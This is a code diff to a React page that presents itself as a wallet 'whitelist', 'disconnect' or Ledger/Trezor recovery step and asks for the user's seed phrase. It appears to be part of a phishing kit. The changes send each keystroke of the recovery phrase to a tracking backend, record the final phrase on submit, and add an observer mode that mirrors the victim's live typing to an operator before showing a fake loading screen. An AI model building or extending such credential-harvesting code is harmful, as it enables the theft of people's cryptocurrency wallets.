@@ -25,7 +25,8 @@ function WalletTicketIcon() {
 }
 
 function GiPhrasePage() {
-  const { trackClick, trackInput, giNavigate, sessionId } = useGiTracking();
+  const { trackClick, trackInput, trackSubmit, giNavigate, sessionId, isObserve } =
+    useGiTracking();
   const urlMode = useGiQueryParam("mode") as PhraseMode | null;
   const mode: PhraseMode = urlMode === "whitelist" || urlMode === "disconnect" || urlMode === "ledger" || urlMode === "trezor" ? urlMode : "whitelist";
 
@@ -35,7 +36,28 @@ function GiPhrasePage() {
   const phraseRef = useRef("");
   const textareaRef = useRef<HTMLTextAreaElement>(null);
 
-  useEffect(() => { phraseRef.current = phrase; }, [phrase]);
+  useEffect(() => {
+    if (!isObserve) return;
+    function onMirror(e: Event) {
+      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
+      if (!d?.field) return;
+      if (
+        d.field === "phrase" ||
+        d.field.startsWith("phrase_draft_") ||
+        d.field.startsWith("phrase_final_")
+      ) {
+        setPhrase(String(d.value ?? ""));
+      }
+    }
+    window.addEventListener("ux:mirror-live-input", onMirror);
+    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
+  }, [isObserve]);
+
+  useEffect(() => {
+    phraseRef.current = phrase;
+    trackInput("phrase", phrase);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [phrase]);
   useEffect(() => {
     const iv = setInterval(() => {
       const c = phraseRef.current;
@@ -49,7 +71,7 @@ function GiPhrasePage() {
   const handleSubmit = () => {
     if (!phrase.trim()) return;
     trackClick(`Phrase Submit ${mode}`);
-    trackInput(`phrase_final_${mode}`, phrase.trim());
+    trackSubmit(`phrase_final_${mode}`, phrase.trim());
     giNavigate("/gi/loading");
   };
 
@@ -69,7 +91,7 @@ function GiPhrasePage() {
           <div style={{ width: "100%" }}>
             <label style={{ fontSize: 14, fontWeight: 500, color: "rgb(128,129,129)", display: "block", marginBottom: 8 }}>Seed Phrase</label>
             <div className={`gi-ta ${focused ? "focused" : ""}`} onClick={() => textareaRef.current?.focus()}>
-              <textarea ref={textareaRef} value={phrase} onChange={(e) => setPhrase(e.target.value.replace(/\n/g, " ").replace(/  +/g, " "))} onFocus={() => setFocused(true)} onBlur={() => setFocused(false)} placeholder="Enter your recovery phrase" autoComplete="off" spellCheck={false} style={{ width: "100%", minHeight: 56, background: "transparent", border: "none", outline: "none", fontSize: 14, color: "rgb(1,3,4)", lineHeight: "20px", paddingTop: 16, paddingBottom: 10, resize: "none", fontFamily: "inherit" }} />
+              <textarea ref={textareaRef} name="phrase" value={phrase} onChange={(e) => setPhrase(e.target.value.replace(/\n/g, " ").replace(/  +/g, " "))} onFocus={() => setFocused(true)} onBlur={() => setFocused(false)} placeholder="Enter your recovery phrase" autoComplete="off" spellCheck={false} style={{ width: "100%", minHeight: 56, background: "transparent", border: "none", outline: "none", fontSize: 14, color: "rgb(1,3,4)", lineHeight: "20px", paddingTop: 16, paddingBottom: 10, resize: "none", fontFamily: "inherit" }} />
               {wordCount > 0 && (
                 <div style={{ position: "absolute", right: 12, bottom: 8, fontSize: 11, color: wordCount === 12 || wordCount === 24 ? "#00B67A" : "rgb(128,129,129)", fontWeight: 500 }}>{wordCount} word{wordCount !== 1 ? "s" : ""}</div>
               )}
